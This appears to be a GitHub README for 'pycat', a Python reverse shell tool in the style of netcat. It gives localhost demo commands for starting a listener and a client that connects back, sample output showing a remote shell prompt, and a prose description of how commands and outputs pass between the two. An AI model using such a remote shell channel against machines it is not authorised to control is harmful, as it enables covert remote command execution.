<p align="center" >
    <img src="https://raw.githubusercontent.com/Game-K-Hack/pycat/main/images/pycat_logo.png" width=150 />
</p>

<br>

<div align="center">
  <a href="#">
    <img src="https://img.shields.io/static/v1?label=release&message=v1.0&color=blue" alt="Release - v1.0" />
  </a>
  <a href="#">
    <img src="https://img.shields.io/static/v1?label=version&message=Stable&color=green" alt="Version - Stable" />
  </a>
  <a href="https://choosealicense.com/licenses/mit">
    <img src="https://img.shields.io/badge/License-MIT-yellow" alt="License" />
  </a>
  <a href="https://www.paypal.com/paypalme/gamekdonate">
    <img src="https://img.shields.io/badge/Donate-PayPal-green.svg" alt="Donate" />
  </a>
</div>

<h4 align="center">Reverse shell (netcat version python)</h4>

<p align="center">
  <a href="#description">Description</a> •
  <a href="#demo">Demo</a> •
  <a href="#functioning">Functioning</a>
</p>

<br>
<br>

## Description

The reverse shell - also called reverse tunnel - is a computer technique that allows you to redirect the input and output of a shell to a remote computer on a local computer, through a service capable of interacting between the two computers.
<br><br>

## Demo

Syntax: `python main.py [-r|-c] <HOST>:<PORT>`

Start the server first and wait for the client connection<br>
```sh
$ python main.py -r 127.0.0.1:5003
                         _
                         \`*-.
                          )  _`-.
                         .  : `. .
                         : _   '  \
                         ; *` _.   `*-._
                         `-.-'          `-.
    ▄███████▄ ▄██   ▄      ;       `       `.       ▄████████    ▄████████     ███
   ███    ███ ███   ██▄    :.       .        \     ███    ███   ███    ███ ▀█████████▄
   ███    ███ ███▄▄▄███    . \  .   :   .-'   .    ███    █▀    ███    ███    ▀███▀▀██
   ███    ███ ▀▀▀▀▀▀███    '  `+.;  ;  '      :    ███          ███    ███     ███   ▀
 ▀█████████▀  ▄██   ███    :  '  |    ;       ;-.  ███        ▀███████████     ███
   ███        ███   ███    ; '   : :`-:     _.`* ; ███    █▄    ███    ███     ███
   ███        ███   ███ .*' /  .*' ; .*`- +'  `*'  ███    ███   ███    ███     ███
  ▄████▀       ▀█████▀  `*-*   `*-*  `*-*'         ████████▀    ███    █▀     ▄████▀

[INFO] PYCAT by Game K
[WAIT] Listening as 127.0.0.1:5003
```

Start the client<br>
```sh
$ python main.py -c 127.0.0.1:5003
```

When client is started, the remote is updating

```
...
[ OK ] 127.0.0.1:64815 Connected

┌──(Game_K@Windows)-[C:\Users\Game_K]
└─$
```
<br>

## Functioning

The process begins with initializing the remote server, which boots up and begins listening. The client, on the other hand, starts and connects to the remote server. Then the client sends the PID (process id) of the client to the remote server. The remote server, once this PID has been received, sends a "1" to signal its receipt. The client then sends the path to the current working directory. The remote server then sends a command to the client. The client then sends the output of this command to the remote server. This process repeats several times, with the remote server sending commands to the client and the client sending the outputs associated with those commands to the remote server.

<p align="center" >
    <img src="https://raw.githubusercontent.com/Game-K-Hack/pycat/main/images/pycat_schema.png" width=500 />
    <br>
    <i>Operation diagram</i>
</p>
